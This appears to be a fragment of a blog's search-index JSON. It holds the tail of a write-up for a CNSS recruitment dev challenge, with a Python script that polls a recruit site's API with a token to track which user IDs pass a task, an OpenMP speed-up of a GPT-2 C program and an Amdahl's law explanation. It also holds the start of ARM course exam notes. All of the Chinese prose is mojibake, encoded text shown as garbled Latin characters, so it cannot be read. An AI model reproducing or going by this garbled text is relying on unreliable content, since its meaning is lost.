&quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: async with session.get(TASK_URL, headers=headers) as response: response.raise_for_status() data = await response.json() tasks = data.get('dev', []) for task in tasks: if task.get('title') == TARGET_TASK_TITLE: return task.get('pass_number') except aiohttp.ClientError as e: print(f&quot;è·å–ä»»åŠ¡æ•°æ®æ—¶å‘ç”Ÿå¼‚å¸¸: {e}&quot;) except Exception as e: print(f&quot;å¤„ç†ä»»åŠ¡æ•°æ®æ—¶å‘ç”Ÿå¼‚å¸¸: {e}&quot;) return Noneasync def fetch_user_submission(session, user_id): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } url = PASSRECORD_URL_TEMPLATE.format(user_id) try: async with session.get(url, headers=headers) as response: response.raise_for_status() return await response.json() except aiohttp.ClientError as e: print(f&quot;è·å–ç”¨æˆ· {user_id} çš„æ•°æ®æ—¶å‡ºé”™: {e}&quot;) except Exception as e: print(f&quot;å¤„ç†ç”¨æˆ· {user_id} çš„æ•°æ®æ—¶å‡ºé”™: {e}&quot;) return None æ•´ä¸ªå‡½æ•°çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼šé€šè¿‡fetchåˆå§‹åŒ–æ¯ä¸ªç”¨æˆ·ï¼ˆè¿™é‡Œæ˜¯530åˆ°535ï¼‰çš„æäº¤å†…å®¹ï¼Œè®°å½•ä¸‹æ¥ï¼Œç„¶åæ¯6ç§’å»ç›‘æµ‹ç‰¹å®šé¢˜ç›®çš„é€šè¿‡äººæ•°æœ‰æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä¸€æ—¦å‘ç”Ÿå˜åŒ–ï¼Œè°ƒç”¨checkå‡½æ•°éå†æ¯”å¯¹ï¼Œæ‰“å°å‡ºä¿¡æ¯ã€‚ 12345678910111213141516171819async def main(): global token token = input(&quot;è¯·è¾“å…¥Token: &quot;).strip() if not token: print(&quot;Tokenä¸èƒ½ä¸ºç©ºã€‚&quot;) return user_ids = USER_ID_RANGE async with aiohttp.ClientSession() as session: await initialize_user_records(session, user_ids) while True: await monitor_pass_number(session, user_ids) await asyncio.sleep(SLEEP_INTERVAL)if __name__ == &quot;__main__&quot;: try: asyncio.run(main()) except KeyboardInterrupt: print(&quot;\\nç¨‹åºå·²æ‰‹åŠ¨ç»ˆæ­¢ã€‚&quot;) ä¸‹é¢æˆ‘ä»¬å®Œå–„éå†ç”¨æˆ·ï¼Œè¿›è¡Œåˆå§‹åŒ–ç”¨æˆ·çš„æäº¤å†…å®¹ï¼š 12345678910async def initialize_user_records(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, submission in zip(user_ids, submissions): if submission is not None: user_submissions[user_id] = submission print(f&quot;åˆå§‹è®°å½•å·²ä¿å­˜ç”¨æˆ· {user_id}ã€‚&quot;) else: print(f&quot;æœªèƒ½è·å–ç”¨æˆ· {user_id} çš„åˆå§‹è®°å½•ã€‚&quot;) æ¥ç€ç›‘æµ‹ç‰¹å®šé¢˜ç›®äººæ•°å¹¶åœ¨å˜åŒ–æ—¶éå†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142async def monitor_pass_number(session, user_ids): global previous_pass_number current_pass_number = await fetch_pass_number(session) if current_pass_number is not None: if previous_pass_number is None: previous_pass_number = current_pass_number print(f&quot;åˆå§‹ pass_number: {current_pass_number}&quot;) elif current_pass_number &gt; previous_pass_number: print(f&quot;pass_number å¢åŠ äº†ï¼æ–°çš„ pass_number: {current_pass_number}&quot;) await check_user_submission_changes(session, user_ids) previous_pass_number = current_pass_number else: print(f&quot;å½“å‰ pass_number: {current_pass_number}&quot;) else: print(&quot;æ— æ³•è·å– pass_number&quot;)async def check_user_submission_changes(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, new_submission in zip(user_ids, submissions): if new_submission is None: continue previous_submission = user_submissions.get(user_id, []) new_tasks = {task['TaskID']: task for task in new_submission} old_tasks = {task['TaskID']: task for task in previous_submission} for task_id, new_task in new_tasks.items(): old_task = old_tasks.get(task_id) if not old_task or old_task.get('Score') != new_task.get('Score'): if new_task.get('TaskTitle') == TARGET_TASK_TITLE: user_name = f&quot;User {user_id}&quot; task_name = new_task.get('TaskTitle') passing_time = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) print(f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;) user_submissions[user_id] = new_submission è¿è¡Œä¸Šè¿°ä»£ç ï¼Œå¾—åˆ°è¾“å‡ºç»“æœã€‚é€Ÿåº¦æœ‰æ˜æ˜¾æå‡ã€‚ ğŸ¤–GPT2ç›®æ ‡ï¼šä½ å¯èƒ½å·²ç»å‘ç°äº†ï¼Œä½ çš„ç¨‹åºå¯èƒ½å¹¶æ²¡æœ‰æˆ‘æ¼”ç¤ºçš„è·‘çš„é‚£ä¹ˆå¿«ï¼ˆç¥æœºè¯·å¿½ç•¥ï¼‰ã€‚ ä½ çš„ç›®æ ‡å°±æ˜¯ä¼˜åŒ–è¯¥ç¨‹åºçš„æ€§èƒ½ï¼Œåœ¨ä¿è¯ç»“æœä¸å˜çš„æƒ…å†µä¸‹æ›´å¿«çš„å®Œæˆæ–‡æœ¬çš„è¡¥å…¨ã€‚ æˆ‘ä¼šä½¿ç”¨ä¸€äº›æµ‹è¯•ç‚¹æ¥è¯„æµ‹ä½ çš„ç¨‹åºçš„æ­£ç¡®æ€§å’Œæ‰§è¡Œæ—¶é—´ã€‚æœŸå¾…æ›´é«˜çš„æ•ˆç‡å’Œæ›´å¤šæ ·çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚ æ­¤å¤–ï¼Œè¯·åœ¨ wp ä¸­å›ç­”ä¸‹é¢çš„é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯é˜¿å§†è¾¾å°”å®šå¾‹ï¼Ÿæ ¹æ®é˜¿å§†è¾¾å°”å®šå¾‹ï¼Œæˆ‘ä»¬åº”è¯¥æŠŠä¼˜åŒ–çš„é‡ç‚¹æ”¾åœ¨å“ªé‡Œï¼Ÿ ä½ çš„ä¼˜åŒ–æ–¹æ¡ˆå’Œæ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿä¼˜åŒ–çš„æ•ˆæœå—åˆ°å“ªäº›å› ç´ å½±å“ï¼Ÿ é¢˜è§£ï¼šæŒ‰ç…§æŒ‡ç¤ºå®ŒæˆGPT2ï¼Œmakeè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°éœ€è¦20å¤šç§’ã€‚ é˜¿å§†è¾¾å°”å®šå¾‹æ˜¯ä¸€ä¸ªç»éªŒæ³•åˆ™ï¼Œä»£è¡¨å¤„ç†å™¨å¹¶è¡Œè¿ç®—ä¹‹åæ•ˆç‡æå‡çš„èƒ½åŠ›ã€‚åœ¨å¹¶è¡Œè®¡ç®—ä¸­ï¼Œä½¿ç”¨å¤šä¸ªå¤„ç†å™¨çš„ç¨‹åºçš„åŠ é€Ÿæ¯”å—é™åˆ¶äºç¨‹åºä¸²è¡Œéƒ¨åˆ†çš„æ‰§è¡Œæ—¶é—´ã€‚$$s(n)=\\frac{1}{B+(1-B)/n}$$ $s(n):$ å›ºå®šè´Ÿè½½ä¸‹ï¼Œç†è®ºä¸Šçš„åŠ é€Ÿæ¯” $B:$ ä¸²è¡Œå·¥ä½œéƒ¨åˆ†æ‰€å æ¯”ä¾‹ï¼Œå–å€¼0~1 $n:$ å¹¶è¡Œçº¿ç¨‹æ•°ï¼Œå¹¶è¡Œå¤„ç†èŠ‚ç‚¹ä¸ªæ•° å¯ä»¥çœ‹å‡ºï¼Œå³ä½¿æˆ‘ä»¬å¢åŠ å¤„ç†å™¨æ•°é‡ï¼Œåªèƒ½å¯¹å¹¶è¡Œéƒ¨åˆ†äº§ç”Ÿå½±å“ï¼Œè€Œå¯¹éå¹¶è¡Œéƒ¨åˆ†æ²¡æœ‰ä»»ä½•å½±å“ã€‚å› æ­¤éšç€å¤„ç†å™¨æ•°é‡å¢åŠ ï¼Œæ•´ä½“æ€§èƒ½çš„æå‡ä¼šè¶‹äºå¹³ç¼“ã€‚ æ ¹æ®é˜¿å§†è¾¾å°”å®šå¾‹ï¼Œåº”è¯¥å°†ä¼˜åŒ–é‡ç‚¹æ”¾åœ¨æœ€å°åŒ–ä¸²è¡Œéƒ¨åˆ†ï¼ŒåŒæ—¶æœ€å¤§åŒ–å¯å¹¶è¡Œéƒ¨åˆ†ã€‚ æµè§ˆæºgpt.cä»£ç ä¸­æ³¨æ„åˆ°ï¼Œå­˜åœ¨çŸ©é˜µä¹˜æ³•ã€æ³¨æ„åŠ›æœºåˆ¶å’Œæ¶‰åŠå¤§é‡è®¡ç®—çš„å¾ªç¯ï¼Œå¯ä»¥è¿›è¡Œå¹¶è¡Œè®¡ç®—ï¼Œå°†ä»»åŠ¡åˆ†é…åˆ°å¤šä¸ªå¤„ç†å™¨ä¸Šï¼Œä½¿ç”¨OpenMPå¹¶è¡ŒåŒ–çŸ©é˜µä¹˜æ³•ã€å‰é¦ˆç¥ç»ç½‘ç»œå±‚ç­‰ã€‚ å…·ä½“æ“ä½œæ˜¯åœ¨matmul_forwardå’Œattention_forwardå‡½æ•°å¾ªç¯å‰æ·»åŠ ä»£ç ï¼š 12#include &lt;omp.h&gt;#pragma omp parallel for collapse(2) åŒæ—¶ï¼Œåœ¨MakeFileä¸­å¼€å¯ç¼–è¯‘é€‰é¡¹-fopenmpã€‚ 12345release: cc gpt.c -lm -O3 -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gptdebug: cc gpt.c -lm -O1 -g -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gpt å‰åå¯¹æ¯”ä¸€ä¸‹ åœ¨ä¿è¯ç»“æœä¸å˜çš„æƒ…å†µä¸‹æ›´å¿«çš„ï¼ˆ5~6ç§’)å®Œæˆäº†æ–‡æœ¬çš„è¡¥å…¨ã€‚ ä¼˜åŒ–æ•ˆæœå—å½±å“çš„å› ç´ ï¼š ä¸²è¡Œéƒ¨åˆ†ï¼šæ€»åŠ é€Ÿæ¯”ä¼šå—åˆ°åˆ¶çº¦ ç¡¬ä»¶èµ„æºï¼šå¯ç”¨å¤„ç†å™¨çš„æ•°é‡å’Œç¡¬ä»¶çš„æ€§èƒ½ ç¼–è¯‘å™¨çš„ä¼˜åŒ–ç¨‹åº¦ å¹¶è¡ŒåŒ–çš„å¼€é”€ã€‚","link":"/2024/11/30/CNSS%20Recruit%20Dev%202024/"},{"title":"ã€ŒUESTC IIã€Advanced RISC Machine","text":"æœ¬æ–‡æ˜¯æˆ‘åœ¨å‡†å¤‡ä¿¡è½¯å­¦é™¢âš™ï¸ARMå¤„ç†å™¨ä½“ç³»ç»“æ„åŠå…¶åº”ç”¨è¿™é—¨è¯¾è€ƒè¯•çš„æ—¶å€™å†™ä¸‹çš„ç¬”è®°ï¼ŒåŒæ—¶ä¹Ÿè®°å½•äº†è¿™é—¨è¯¾çš„å®éªŒä»»åŠ¡ã€‚ è¯¾ç¨‹ç›®æ ‡ï¼š CO1ï¼šè®©å­¦ç”ŸæŒæ¡åµŒå…¥å¼ç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†ï¼ŒåµŒå…¥å¼å¤„ç†å™¨ç³»åˆ—ï¼ŒåµŒå…¥å¼ç³»ç»Ÿå¼€å‘ç¯å¢ƒï¼ŒåµŒå…¥å¼æ“ä½œç³»ç»Ÿç­‰ï¼ŒåŸ¹å…»å­¦ç”Ÿä¸“ä¸šçŸ¥è¯†èƒ½åŠ›ã€‚ CO2ï¼šè®©å­¦ç”ŸæŒæ¡ARM9å¤„ç†å™¨å†…æ ¸ï¼ŒARMå¤„ç†å™¨å·¥ä½œçŠ¶æ€ï¼ŒARMå¤„ç†å™¨è¿è¡Œæ¨¡å¼ï¼ŒARMå¯„å­˜å™¨ï¼ŒARMå­˜å‚¨ç³»ç»Ÿï¼ŒARMçš„å¼‚å¸¸ç­‰ï¼ŒåŸ¹å…»å­¦ç”Ÿåº•å±‚ç¡¬ä»¶çš„èƒ½åŠ›ã€‚ CO3ï¼šè®©å­¦ç”ŸæŒæ¡ARMå¯»å€æ–¹å¼å’ŒæŒ‡ä»¤ç³»ç»Ÿï¼ŒARMçš„ä¼ªæŒ‡ä»¤ï¼ŒARMçš„ç®€å•ç¼–ç¨‹å’ŒARMçš„ç»¼åˆç¼–ç¨‹ï¼ŒåŸ¹å…»å­¦ç”Ÿåº•å±‚ç»¼åˆç¼–ç¨‹èƒ½åŠ›ã€‚ CO4ï¼šè®©å­¦ç”ŸæŒæ¡S3C2440åµŒå…¥å¼å¤„ç†å™¨ï¼ŒæŒæ¡S3C2440å¤„ç†å™¨çš„å¤–è®¾åŠåº”ç”¨ã€‚åŸ¹å…»å­¦ç”Ÿè§£å†³å¤æ‚ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œå¦‚ç®€å•çš„ç¡¬ä»¶è®¾è®¡ï¼Œä»¥åŠåŸºäºè½¯ç¡¬ä»¶çš„ç»¼åˆè®¾è®¡ã€ç¼–ç¨‹èƒ½åŠ›ã€‚ï¼ˆä¸è€ƒï¼‰ è€ƒæ ¸æ–¹å¼ï¼š å¹³æ—¶æˆç»©ï¼ˆ40%ï¼‰+æœŸæœ«è€ƒè¯•ï¼ˆ60%ï¼‰ å¹³æ—¶æˆç»©ï¼š15%æœŸä¸­éšå ‚æµ‹éªŒ + 25%ä½œä¸š + 60%å®éªŒ æ€»è¯„æˆç»©ï¼ˆ100ï¼‰= æœŸä¸­ï¼ˆ6ï¼‰+ ä½œä¸šï¼ˆ10ï¼‰+ å®éªŒï¼ˆ24ï¼‰+ æœŸæœ«ï¼ˆ60ï¼‰ Topics Coveredï¼š åµŒå…¥å¼ç³»ç»Ÿ ARM å¤„ç†å™¨ç³»ç»Ÿç»“æ„ ARM æŒ‡ä»¤é›† ARM ä¼ªæŒ‡ä»¤åŠç¼–ç¨‹ åµŒå…¥å¼ç³»ç»ŸåŸºç¡€ä½œä¸šé¢˜ï¼š ä¸€ã€ä»€ä¹ˆæ˜¯åµŒå…¥å¼ç³»ç»Ÿï¼Ÿ é€šå¸¸çš„å®šä¹‰ï¼šåµŒå…¥å¼ç³»ç»Ÿæ˜¯ä»¥åº”ç”¨ä¸ºä¸­å¿ƒï¼Œä»¥è®¡ç®—æœºæŠ€æœ¯ä¸ºåŸºç¡€ï¼Œé‡‡ç”¨å¯å‰ªè£è½¯ç¡¬ä»¶ï¼Œé€‚ç”¨äºå¯¹åŠŸèƒ½ã€å¯é æ€§ã€æˆæœ¬ã€ä½“ç§¯ã€åŠŸè€—ç­‰æœ‰ä¸¥æ ¼è¦æ±‚çš„ä¸“ç”¨è®¡ç®—æœºç³»ç»Ÿã€‚ é€šä¿—çš„å®šä¹‰ï¼šåµŒå…¥åˆ°å¯¹è±¡ä½“ç³»ä¸­çš„ä¸“ç”¨è®¡ç®—æœºç³»ç»Ÿã€‚ åµŒå…¥æ€§ã€ä¸“ç”¨æ€§ä¸è®¡ç®—æœºç³»ç»Ÿæ˜¯åµŒå…¥å¼ç³»ç»Ÿçš„ä¸‰ä¸ªåŸºæœ¬è¦ç´ ã€‚ äºŒã€åµŒå…¥å¼å¾®å¤„ç†å™¨çš„ä½“ç³»ç»“æ„æœ‰å“ªä¸¤ç§ï¼Ÿç®€å•ä¸¤ç§ä½“ç³»ç»“æ„å„è‡ªçš„ç‰¹ç‚¹ã€‚ åµŒå…¥å¼å¾®å¤„ç†å™¨çš„ä½“ç³»ç»“æ„æœ‰å†¯.è¯ºä¾æ›¼ç»“æ„å’Œå“ˆä½›ç»“æ„ä¸¤ç§ã€‚ å†¯.è¯ºä¾æ›¼ç»“æ„ä¹Ÿç§°ä¸ºæ™®æ—æ–¯é¡¿ç»“æ„ï¼Œæ˜¯ä¸€ç§å°†ç¨‹åºæŒ‡ä»¤å­˜å‚¨å™¨å’Œæ•°æ®å­˜å‚¨å™¨åˆå¹¶åœ¨ä¸€èµ·çš„å­˜å‚¨å™¨ç»“æ„ã€‚å•æ¬¡å–æŒ‡ä»¤é•¿åº¦å’Œå–æ•°æ®çš„é•¿åº¦ç›¸åŒã€‚ å“ˆä½›ç»“æ„ï¼šæ˜¯ä¸€ç§å°† ç¨‹åºæŒ‡ä»¤å­˜å‚¨å’Œæ•°æ®å­˜å‚¨åˆ†å¼€çš„å­˜å‚¨å™¨ç»“æ„ã€‚ç¨‹åºæŒ‡ä»¤å­˜å‚¨å’Œæ•°æ®å­˜å‚¨åˆ†å¼€ï¼Œå•æ¬¡å–æŒ‡ä»¤é•¿åº¦å’Œå–æ•°æ®çš„é•¿åº¦å¯ä»¥ä¸ç›¸åŒã€‚ ä¸‰ã€ç®€å•æè¿°åµŒå…¥å¼å®æ—¶æ“ä½œç³»ç»Ÿä¸­çš„ä»»åŠ¡çš„å››ä¸ªçŠ¶æ€ã€‚ å®æ—¶æ“ä½œç³»ç»Ÿä¸­çš„ä»»åŠ¡æœ‰å››ä¸ªçŠ¶æ€ï¼šè¿è¡Œã€å°±ç»ªã€æŒ‚èµ·ã€å†¬çœ ã€‚ è¿è¡Œï¼šè·å¾— CPU çš„æ§åˆ¶æƒã€‚ å°±ç»ªï¼šè¿›å…¥ä»»åŠ¡ç­‰å¾…é˜Ÿåˆ—ï¼Œç­‰å¾…é€šè¿‡è°ƒåº¦è½¬ä¸ºè¿è¡ŒçŠ¶æ€ã€‚ æŒ‚èµ·ï¼šä»»åŠ¡å‘ç”Ÿé˜»å¡ï¼Œç§»å‡ºä»»åŠ¡å°±ç»ªé˜Ÿåˆ—ï¼Œç­‰å¾…ç³»ç»Ÿå®æ—¶äº‹ä»¶çš„å‘ç”Ÿè€Œå”¤é†’ï¼Œä»è€Œè½¬ä¸º å°±ç»ª æˆ– è¿è¡Œã€‚ å†¬çœ ï¼šä»»åŠ¡å®Œæˆ æˆ– é”™è¯¯ ç­‰åŸå› è¢«æ¸…é™¤çš„ä»»åŠ¡ï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„ä»»åŠ¡ã€‚ å››ã€ç®€è¿°ç²¾ç®€æŒ‡ä»¤é›† RISC å’Œå¤æ‚æŒ‡ä»¤é›† CISC çš„ä¸»è¦åŒºåˆ« ä»¥ä¸‹å…³äº RISC å’Œ CISC è¯´æ³•æ­£ç¡®çš„æ˜¯( Aã€C ) Aã€RISC ä¸€ä¸ªå‘¨æœŸæ‰§è¡Œä¸€æ¡æŒ‡ä»¤ Bã€RISC ç›¸å¯¹äº CISCï¼Œå…¶æŒ‡ä»¤é›†å®ç°çš„åŠŸèƒ½æ›´å¤š Ã— Cã€RISC ç›¸å¯¹äº CISC å…·æœ‰æ›´å¤šçš„å¯„å­˜å™¨ Dã€RISC èƒ½ç›´æ¥å¤„ç†å­˜å‚¨å™¨ä¸­çš„æ•°æ® åµŒå…¥å¼ç³»ç»Ÿçš„ä¸‰ä¸ªåŸºæœ¬è¦ç´ æ˜¯ï¼ˆ Aã€Bã€C ï¼‰ Aï¼šåµŒå…¥æ€§ Bï¼šä¸“ç”¨æ€§ Cï¼šè®¡ç®—æœºç³»ç»Ÿ Dï¼šé€šç”¨æ€§ åœ¨ä»¥ä¸‹åˆ†ç±»ä¸­ï¼Œå±äºæŒ‰å®æ—¶æ€§åˆ’åˆ†çš„æ˜¯( Bã€D )ã€‚ Aã€8 ä½åµŒå…¥å¼ç³»ç»Ÿã€‚ Bã€ç¡¬å®æ—¶ç³»ç»Ÿã€‚ Cã€å‰åå°ç³»ç»Ÿ Dã€è½¯å®æ—¶ç³»ç»Ÿ å±äºç¡¬ä»¶è°ƒè¯•å·¥å…·æ˜¯ï¼ˆ Aã€Cã€D ï¼‰ã€‚ Aã€å®æ—¶åœ¨çº¿ä»¿çœŸå™¨ Bã€ç”µè·¯å¼€å‘æ¿ Cã€é€»è¾‘åˆ†æä»ª Dã€ROM ä»¿çœŸå™¨ åœ¨ä¸‹åˆ—åµŒå…¥å¼å¤„ç†å™¨ç±»å‹ä¸­ï¼Œé›†æˆåº¦æœ€é«˜çš„æ˜¯( D )ã€‚ Aã€åµŒå…¥å¼å¾®å¤„ç†å™¨ Bã€åµŒå…¥å¼å¾®æ§åˆ¶å™¨ Cã€åµŒå…¥å¼ DSP å¤„ç†å™¨ Dã€SOC ç‰‡ä¸Šç³»ç»Ÿ å®æ—¶æ“ä½œç³»ç»Ÿä¸­çš„ä»»åŠ¡çš„å°±ç»ªçŠ¶æ€æ˜¯æŒ‡( B )ã€‚ Aã€è·å¾— CPU çš„æ§åˆ¶æƒã€‚ Bã€è¿›å…¥ä»»åŠ¡ç­‰å¾…é˜Ÿåˆ—ï¼Œç­‰å¾…é€šè¿‡è°ƒåº¦è½¬ä¸ºè¿è¡ŒçŠ¶æ€ã€‚ Cã€ä»»åŠ¡å‘ç”Ÿé˜»å¡ï¼Œç§»å‡ºä»»åŠ¡å°±ç»ªé˜Ÿåˆ—ã€‚ Dã€ä»»åŠ¡å®Œæˆæˆ–é”™è¯¯ ç­‰åŸå› è¢«æ¸…é™¤çš„ä»»åŠ¡ã€‚ ARM å¤„ç†å™¨åŠç³»ç»Ÿç»“æ„ARM å¤„ç†å™¨ç®€ä»‹ARM å¤„ç†å™¨ç³»åˆ—ARM9 å¤„ç†å™¨å†…æ ¸ä»¥ä¸Š PPTã€‚ *ARM å¤„ç†å™¨å·¥ä½œçŠ¶æ€åµŒå…¥å¼ç³»ç»Ÿåœ¨æŸäº›åº”ç”¨åœºåˆå¯¹å­˜å‚¨æˆæœ¬æˆ–ç©ºé—´è¦æ±‚æ¯”è¾ƒè‹›åˆ»ï¼Œä¸ºäº†è®©ç”¨æˆ·æ›´å¥½åœ°æ§åˆ¶ä»£ç é‡ï¼Œäºæ˜¯è®¾è®¡äº†2å¥—æŒ‡ä»¤ç³»ç»Ÿï¼Œåˆ†åˆ«ä¸ºARMæŒ‡ä»¤é›†å’ŒThumbæŒ‡ä»¤é›†ã€‚å…¶ä¸­ARMæŒ‡ä»¤é›†ä¸º32ä½ï¼ˆå­—ï¼‰é•¿åº¦ï¼Œå…·æœ‰æœ€å®Œæ•´çš„åŠŸèƒ½ï¼›ThumbæŒ‡ä»¤é›†ä¸º16ä½ï¼ˆåŠå­—ï¼‰é•¿åº¦ï¼Œèƒ½å®ç°ARMæŒ‡ä»¤é›†çš„å¤§éƒ¨åˆ†åŠŸèƒ½ã€‚åœ¨åŠŸèƒ½ä¸Šå¯ä»¥è®¤ä¸ºThumbæ˜¯ARMæŒ‡ä»¤é›†çš„å­é›†ã€‚ ARMå¾®å¤„ç†å™¨ä¸­æ”¯æŒå­—èŠ‚ï¼ˆ8ä½ï¼‰ã€åŠå­—ï¼ˆ16ä½ï¼‰ã€å­—ï¼ˆ32ä½ï¼‰ä¸‰ç§æ•°æ®ç±»å‹ã€‚ *ARM å¤„ç†å™¨è¿è¡Œæ¨¡å¼ARMä½“ç³»ç»“æ„æ”¯æŒ 7ç§ è¿è¡Œæ¨¡å¼ã€‚ï¼ˆPPT 66 é¡µï¼‰ é™¤ç”¨æˆ·æ¨¡å¼å¤–çš„å…¶å®ƒ6ç§å¤„ç†å™¨æ¨¡å¼ç§°ä¸ºç‰¹æƒæ¨¡å¼ï¼ˆPrivileged Modesï¼‰ã€‚åœ¨ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œç¨‹åºå¯ä»¥è®¿é—®æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºï¼Œä¹Ÿå¯ä»¥ä»»æ„çš„è¿›è¡Œå¤„ç†å™¨æ¨¡å¼åˆ‡æ¢ã€‚åªæœ‰åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰å…è®¸å¯¹å½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆCPSRï¼‰çš„æ‰€æœ‰æ§åˆ¶ä½ç›´æ¥è¿›è¡Œè¯»/å†™è®¿é—®ï¼Œè€Œåœ¨éç‰¹æƒæ¨¡å¼ä¸‹åªå…è®¸å¯¹CPSRçš„æ§åˆ¶ä½è¿›è¡Œé—´æ¥è®¿é—®ï¼ˆSWIæ–¹å¼ï¼‰ã€‚ *ARM å¯„å­˜å™¨ARMå¤„ç†å™¨æœ‰å¦‚ä¸‹37ä¸ªç”¨æˆ·å¯è§å¯„å­˜å™¨ã€‚ï¼ˆPPT 72 é¡µï¼‰31ä¸ªé€šç”¨å¯„å­˜å™¨ä»¥åŠ6ä¸ªçŠ¶æ€å¯„å­˜å™¨ã€‚ ARM å¤„ç†å™¨å…±æœ‰ 7 ç§è¿è¡Œæ¨¡å¼ï¼Œåœ¨æ¯ä¸€ç§å¤„ç†å™¨æ¨¡å¼ä¸­éƒ½æœ‰ä¸€ç»„ç›¸åº”çš„å¯„å­˜å™¨ã€‚ åœ¨ARMçŠ¶æ€ä¸‹ï¼Œä»»ä¸€æ—¶åˆ»éƒ½å¯ä»¥è®¿é—®åˆ° 16ä¸ªé€šç”¨å¯„å­˜å™¨å’Œ1~2ä¸ªçŠ¶æ€å¯„å­˜å™¨ã€‚ è¿™äº›æ¡ä»¶æ ‡å¿—ä½ä¼šæ ¹æ®ç¨‹åºä¸­çš„ç®—æ•°æŒ‡ä»¤æˆ–é€»è¾‘æŒ‡ä»¤çš„æ‰§è¡Œç»“æœè¿›è¡Œæ”¹å˜ï¼Œè€Œä¸”è¿™äº›æ¡ä»¶æ ‡å¿—ä½å¯ç”±å¤§å¤šæ•°æŒ‡ä»¤æ£€æµ‹ä»¥å†³å®šæŒ‡ä»¤æ˜¯å¦æ‰§è¡Œã€‚ ï¼ˆ1ï¼‰N æœ¬ä½è®¾ç½®æˆå½“å‰æŒ‡ä»¤æ‰§è¡Œç»“æœçš„ç¬¬31ä½ã€‚å½“ä¸¤ä¸ªç”±è¡¥ç è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°è¿ç®—æ—¶ï¼ŒN=1 è¡¨ç¤ºç»“æœä¸ºè´Ÿæ•°ï¼›å¦åˆ™ç»“æœä¸ºæ­£æ•°æˆ–é›¶ã€‚ ï¼ˆ2ï¼‰Z Z=1 è¡¨ç¤ºè¿ç®—çš„ç»“æœä¸ºé›¶ï¼Œå¦åˆ™ç»“æœä¸ä¸ºé›¶ã€‚ ï¼ˆ3ï¼‰C åˆ† 4 ç§æƒ…å†µè®¾ç½® C çš„æ–¹æ³•ï¼š â‘  åœ¨åŠ æ³•æŒ‡ä»¤ä¸­ï¼ˆåŒ…æ‹¬æ¯”è¾ƒæŒ‡ä»¤CMNï¼‰ï¼Œå½“ç»“æœäº§ç”Ÿäº†è¿›ä½ï¼Œåˆ™C=1ï¼Œè¡¨ç¤ºæ— ç¬¦å·æ•°è¿ç®—å‘ç”Ÿä¸Šæº¢å‡ºï¼Œå…¶å®ƒæƒ…å†µä¸‹C=0; â‘¡ åœ¨å‡æ³•æŒ‡ä»¤ä¸­ï¼ˆåŒ…æ‹¬æ¯”è¾ƒæŒ‡ä»¤CMPï¼‰ï¼Œå½“è¿ç®—ä¸­å‘ç”Ÿäº†å€Ÿä½ï¼Œåˆ™C=0ï¼Œå…¶å®ƒæƒ…å†µä¸‹C=1; â‘¢ å¯¹äºåœ¨æ“ä½œæ•°ä¸­åŒ…å«ç§»ä½æ“ä½œçš„è¿ç®—æŒ‡ä»¤ï¼ˆéåŠ /å‡æŒ‡ä»¤ï¼‰ï¼ŒCè¢«è®¾ç½®æˆè¢«ç§»ä½å¯„å­˜å™¨æœ€åç§»å‡ºå»çš„ä½; â‘£ å¯¹äºå…¶å®ƒéåŠ /å‡æ³•è¿ç®—æŒ‡ä»¤ï¼ŒCçš„å€¼é€šå¸¸ä¸å—å½±å“ã€‚ ï¼ˆ4ï¼‰V 